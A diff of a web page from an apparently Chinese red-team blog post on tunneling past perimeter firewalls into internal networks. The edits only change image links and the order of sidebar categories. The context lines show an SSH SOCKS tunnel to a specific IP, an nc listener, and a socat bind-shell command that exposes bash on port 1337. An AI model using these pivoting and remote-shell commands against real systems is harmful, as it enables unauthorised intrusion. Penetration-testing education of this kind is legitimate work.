@@ -138,7 +138,7 @@
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
         <p>在企业安全对抗中，红方攻击团队经常会遇到这种情况，在企业的网络边界上获取到部分权限，比如一个web服务器的webshell，然而如何更方便的进行下一步的渗透呢？如何对内网进行渗透测试，这时就需要隧道转发技术，穿透边界防火墙、安全代理等安全设备，进行深层次的安全测试。本文的主要内容是穿透内网的各种姿势。</p>
-<h2 id="典型的边界网络架构图"><a href="#典型的边界网络架构图" class="headerlink" title="典型的边界网络架构图"></a>典型的边界网络架构图</h2><p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640.webp" alt="img"></p>
+<h2 id="典型的边界网络架构图"><a href="#典型的边界网络架构图" class="headerlink" title="典型的边界网络架构图"></a>典型的边界网络架构图</h2><p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640.webp" alt="图片"></p>
 <h2 id="利用ssh建立隧道"><a href="#利用ssh建立隧道" class="headerlink" title="利用ssh建立隧道"></a>利用ssh建立隧道</h2><h3 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h3><p>原理：建立一个动态的SOCKS4/5的代理通道，紧接着的是本地监听的端口号；动态端口转发是建立一个ssh加密的SOCKS4/5代理通道，任何支持SOCKS4/5协议的程序都可以使用这个加密的通道来进行代理访问。</p>
 <p>本地执行命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 root@106.22.50.48</span><br></pre></td></tr></table></figure>
@@ -209,7 +209,7 @@
 <p>windows： cntlm.exe -c config.conf</p>
 <p>linux：./cntlm -c config.conf</p>
 <p>配置文件样例：</p>
-<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640.webp" alt="图片"></p>
+<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640-163559864284821" alt="图片"></p>
 <p>作用：内网服务器访问serverB的2222端口，也就是访问到vps的443端口。</p>
 <h2 id="通过socks代理访问内网"><a href="#通过socks代理访问内网" class="headerlink" title="通过socks代理访问内网"></a>通过socks代理访问内网</h2><h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><p>假设代理服务器地址是：222.222.222.223:1080</p>
 <p>修改配置文件，将代理地址设置为代理服务器的地址如下:</p>
@@ -223,7 +223,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 4444</span><br></pre></td></tr></table></figure>
 
 <p>在serverB上执行：</p>
-<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640-163559864284822" alt="图片"></p>
 <p>socat</p>
 <h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><p>vps上执行监听1337端口：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
@@ -337,26 +337,26 @@
     <ul class="categorys-list">
       
         <li class="categorys-list-item">
-          <a href="/categories/%E6%B8%97%E9%80%8F/">
-            渗透 (2)
-          </a>
-        </li>
-      
-        <li class="categorys-list-item">
           <a href="/categories/%E5%B7%A5%E5%85%B7/">
             工具 (3)
           </a>
         </li>
       
         <li class="categorys-list-item">
-          <a href="/categories/%E6%BC%8F%E6%B4%9E/">
-            漏洞 (1)
+          <a href="/categories/%E6%B8%97%E9%80%8F/">
+            渗透 (2)
           </a>
         </li>
       
         <li class="categorys-list-item">
           <a href="/categories/%E5%85%8D%E6%9D%80/">
             免杀 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E/">
+            漏洞 (1)
           </a>
         </li>
       
@@ -391,14 +391,14 @@
         </li>
       
         <li class="categorys-list-item">
-          <a href="/categories/%E9%98%B2%E7%81%AB%E5%A2%99/">
-            防火墙 (1)
+          <a href="/categories/%E6%9A%97%E7%BD%91/">
+            暗网 (1)
           </a>
         </li>
       
         <li class="categorys-list-item">
-          <a href="/categories/%E6%9A%97%E7%BD%91/">
-            暗网 (1)
+          <a href="/categories/%E9%98%B2%E7%81%AB%E5%A2%99/">
+            防火墙 (1)
           </a>
         </li>
       
